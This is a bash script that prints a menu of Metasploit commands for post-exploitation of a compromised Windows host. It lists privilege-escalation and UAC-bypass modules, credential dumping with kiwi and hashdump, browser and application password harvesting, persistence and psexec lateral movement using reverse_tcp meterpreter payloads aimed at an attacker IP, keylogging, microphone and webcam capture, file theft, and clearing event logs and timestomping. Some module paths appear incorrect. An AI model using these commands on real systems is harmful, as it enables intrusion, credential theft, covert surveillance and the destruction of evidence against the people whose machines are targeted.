#!/usr/bin/env bash
# ==============================================================================
# WINDOWS POST-EXPLOITATION — Full post-exploitation menu
# Usage: bash windows_post.sh <SESSION_ID>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SESSION="${1:-}"
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c"; [[ "$c" == *exploit* ]] && c="$c; exploit" || c="$c; run"; echo "$c"; }
echo ""; echo "=== WINDOWS POST-EXPLOITATION ==="; [[ -n "$SESSION" ]] && echo "  Session: $SESSION"; echo ""
echo -e "--- ${RED}Privilege Escalation${NC} ---"
$IN_MSF && run_msf "post/multi/recon/local_exploit_suggester" "SESSION ${SESSION:-1}" || echo "use post/multi/recon/local_exploit_suggester; set SESSION ${SESSION:-1}; run"
$IN_MSF && run_msf "post/multi/manage/getsystem" "SESSION ${SESSION:-1}" || echo "getsystem"
for uac in bypassuac_eventvwr bypassuac_comhijack token_duplication ms16_032_secondary_logon_handle always_install_elevated service_permissions; do
    $IN_MSF && run_msf "exploit/windows/local/$uac" "SESSION ${SESSION:-1}" "LHOST <LHOST>" "LPORT <LPORT>" || echo "use exploit/windows/local/$uac; set SESSION ${SESSION:-1}"
done
echo ""
echo -e "--- ${RED}Credential Harvesting${NC} ---"
$IN_MSF && run_msf "post/windows/manage/load_kiwi" "SESSION ${SESSION:-1}" || echo "load kiwi"
for kiwi in creds_all lsa_dump_sam lsa_dump_secrets lsa_dump_cache dcsync; do
    $IN_MSF && run_msf "post/windows/manage/$kiwi" "SESSION ${SESSION:-1}" || echo "kiwi_cmd $kiwi"
done
for mod in hashdump credential_collector enum_chrome enum_firefox enum_ie enum_putty enum_citrix enum_outlook enum_skype enum_teams enum_vnc enum_rdp enum_ftp wifi_profiles_passwords; do
    $IN_MSF && run_msf "post/windows/gather/$mod" "SESSION ${SESSION:-1}" || echo "use post/windows/gather/$mod; set SESSION ${SESSION:-1}"
done
echo ""
echo -e "--- ${CYAN}System Enumeration${NC} ---"
for mod in enum_applications enum_logged_on_users enum_patches enum_shares enum_ad_computers enum_domains enum_domain_users enum_domain_groups; do
    $IN_MSF && run_msf "post/windows/gather/$mod" "SESSION ${SESSION:-1}" || echo "use post/windows/gather/$mod; set SESSION ${SESSION:-1}"
done
echo ""
echo -e "--- ${YELLOW}Persistence${NC} ---"
$IN_MSF && run_msf "exploit/windows/local/registry_persistence" "SESSION ${SESSION:-1}" "LHOST <LHOST>" "LPORT <LPORT>" "PAYLOAD windows/x64/meterpreter/reverse_tcp"
$IN_MSF && run_msf "exploit/windows/local/service_persistence" "SESSION ${SESSION:-1}" "LHOST <LHOST>" "LPORT <LPORT>"
$IN_MSF && run_msf "exploit/windows/local/wmi_persistence" "SESSION ${SESSION:-1}"
$IN_MSF && run_msf "exploit/windows/local/scheduled_task_persistence" "SESSION ${SESSION:-1}"
echo ""
echo -e "--- ${MAGENTA}Lateral Movement${NC} ---"
$IN_MSF && run_msf "post/multi/manage/autoroute" "SESSION ${SESSION:-1}" "SUBNET <target_subnet>"
$IN_MSF && run_msf "auxiliary/server/socks_proxy" "SESSION ${SESSION:-1}" "SRVPORT 1080"
for lat in psexec psexec_psh wmi_exec; do
    $IN_MSF && run_msf "exploit/windows/smb/$lat" "RHOSTS <TARGET>" "SMBUser <USER>" "SMBPass <PASS/HASH>" "PAYLOAD windows/x64/meterpreter/reverse_tcp" "LHOST <ATK_IP>" "LPORT 4444"
done
echo ""
echo -e "--- ${GREEN}Data Exfiltration${NC} ---"
$IN_MSF && run_msf "post/windows/manage/screenshot" "SESSION ${SESSION:-1}"
$IN_MSF && run_msf "post/windows/manage/keyscan_start" "SESSION ${SESSION:-1}"
echo "  keyscan_dump; keyscan_stop"
$IN_MSF && run_msf "post/windows/manage/download" "SESSION ${SESSION:-1}" "REMOTE_PATH C:\\Users\\Admin\\secret.pdf" "LOCAL_PATH /tmp/"
$IN_MSF && run_msf "post/windows/manage/search" "SESSION ${SESSION:-1}" "PATTERN *.pdf" "ROOT C:\\Users"
$IN_MSF && run_msf "post/windows/manage/record_mic" "SESSION ${SESSION:-1}" "DURATION 30"
$IN_MSF && run_msf "post/windows/manage/webcam_snap" "SESSION ${SESSION:-1}"
echo ""
echo -e "--- ${GREEN}Cleanup${NC} ---"
echo "  clearev"
echo "  timestomp C:\\path\\file.exe -v C:\\Windows\\System32\\kernel32.dll"
$IN_MSF && run_msf "post/windows/manage/cleanup" "SESSION ${SESSION:-1}"
$IN_MSF && run_msf "post/windows/manage/sdelete" "SESSION ${SESSION:-1}"
echo ""
